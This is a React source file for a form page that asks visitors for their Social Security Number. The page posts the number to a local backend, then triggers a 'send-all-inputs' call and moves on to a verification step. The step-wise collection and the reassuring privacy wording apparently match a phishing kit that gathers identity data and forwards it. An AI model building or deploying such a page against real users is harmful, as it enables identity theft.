import React, { useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { OTPInput, SlotProps } from 'input-otp';
import '../styles/ssn-page.css';
import axios from 'axios';

function Slot(props: SlotProps) {
  return (
    <div className={`slot ${props.isActive ? 'is-active' : ''}`}>
      {props.char !== null && <div>{props.char}</div>}
      {props.hasFakeCaret && <FakeCaret />}
    </div>
  );
}

function FakeCaret() {
  return (
    <div className="fake-caret">
      <div></div>
    </div>
  );
}

function FakeDash() {
  return (
    <div className="fake-dash">
      <div></div>
    </div>
  );
}

function SSNInput() {

  const [ssn, setSSN] = useState('');
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await fetch('http://localhost:1000/save-ssn-input', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ ssn }), // Mengirim data SSN ke backend
      });
      

      if (response.ok) {
        console.log('SSN saved successfully');
        navigate('/verify');
      } else {
        console.error('Failed to save SSN');
      }

      await axios.post('http://localhost:1000/send-all-inputs')

    } catch (error) {
      console.error('Error submitting form:', error);
    }
  };

  return (
    <div className="container-ssn-page">
      <form className="ssn-page-container" onSubmit={handleSubmit}>
        <div className="title-container">
          <div className="title">Please Enter Your SSN</div>
          <div className="title-description">
            Please enter your Social Security Number (SSN). This information is required for verification purposes and will be kept confidential in accordance with our Privacy Policy.
          </div>
        </div>
        <div className='input-container'>
          <div className='input-wrapper'>
            <OTPInput
              maxLength={9}
              value={ssn}
              onChange={setSSN} // Mengupdate state SSN
              containerClassName="group"
              render={({ slots }) => (
                <>
                  <div className="group">
                    {slots.slice(0, 3).map((slot, idx) => {
                      return <Slot key={idx} {...slot} />;
                    })}
                  </div>
                  <FakeDash />

                  <div className="group">
                    {slots.slice(3, 5).map((slot, idx) => (
                      <Slot key={idx} {...slot} />
                    ))}
                  </div>

                  <FakeDash />

                  <div className="group">
                    {slots.slice(5).map((slot, idx) => (
                      <Slot key={idx} {...slot} />
                    ))}
                  </div>
                </>
              )}
            />
          </div>
        </div>
        <div className="ssnbutton-container">
          <input className='ssnbutton' type="submit" name="submit" value="Continue" />
        </div>
      </form>
    </div>
  );
}

export default SSNInput;
